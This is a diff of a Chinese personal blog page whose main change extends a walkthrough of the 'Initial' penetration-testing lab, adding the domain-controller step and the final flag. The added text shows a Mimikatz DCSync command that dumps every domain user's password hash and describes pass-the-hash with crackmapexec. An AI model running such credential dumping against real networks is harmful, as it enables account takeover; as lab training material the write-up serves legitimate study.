@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://luo-kaihong.github.io/p/2025-initial/'>
 
-<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2025-Initial">
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-Initial">
 <meta property='og:description' content=" 春秋云境 Initial 靶标介绍： Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-initial/'>
 <meta property='og:site_name' content='罗铠鸿'>
@@ -378,7 +378,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 4 分钟
                 </time>
             </div>
         
@@ -772,7 +772,8 @@
 ></p>
 <p>像这样就成功了，如果没成功，可能是网络波动，再执行一次exploit即可。</p>
 <h3 id="打域控">打域控
-</h3><div class="highlight"><div class="chroma">
+</h3><p>然后我们load kiwi，抓取用户的hash，依次执行</p>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -782,7 +783,25 @@
 </span></span><span class="line"><span class="cl"><span class="n">kiwi_cmd</span> <span class="s2">&#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34;</span> <span class="n">exit</span>  <span class="c1"># 导出域内所有用户的信息(包括哈希值)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div>
+</div><img src="image-20250904194405750.png" alt="image-20250904194405750" style="zoom:50%;" />
+<p>我们抓到了Administrator的hash，所以可以直接用crackmapexec打hash传递了</p>
+<p><img src="/p/2025-initial/image-20250904194528058.png"
+	width="1529"
+	height="794"
+	srcset="/p/2025-initial/image-20250904194528058_hu_544cf99535e8026d.png 480w, /p/2025-initial/image-20250904194528058_hu_aafff2b1546bd851.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250904194528058"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="192"
+		data-flex-basis="462px"
+	
+></p>
+<p>得到<code>e8f88d0d43d6} </code>,所以flag是<code>flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}</code></p>
+<p>做的第一份渗透，还是非常质量，这些内网与flag都没变，大大缩短了我的时间非常贴心，知识点也十分正点！</p>
+
 </section>
 
 
@@ -837,12 +856,12 @@
             
                 
 <article class="">
-    <a href="/p/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+    <a href="/p/2025-%E6%98%A5%E7%A7%8B%E9%95%BF%E5%9F%8E%E6%9D%AF/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2023-极客大挑战</h2>
+            <h2 class="article-title">2025-春秋长城杯</h2>
         </div>
     </a>
 </article>
@@ -850,12 +869,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-8.8%E6%97%A5awd/">
+    <a href="/p/2025n1ctf/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-8.8日AWD</h2>
+            <h2 class="article-title">2025N1CTF</h2>
         </div>
     </a>
 </article>
@@ -863,12 +882,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9Fctf/">
+    <a href="/p/2025-%E6%B9%BE%E5%8C%BA%E6%9D%AF/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-第十届上海大学生ctf</h2>
+            <h2 class="article-title">2025-湾区杯</h2>
         </div>
     </a>
 </article>
@@ -876,12 +895,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-swpu-nssctf/">
+    <a href="/p/2025-9.6awd/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-swpu-nssctf</h2>
+            <h2 class="article-title">2025-9.6awd</h2>
         </div>
     </a>
 </article>
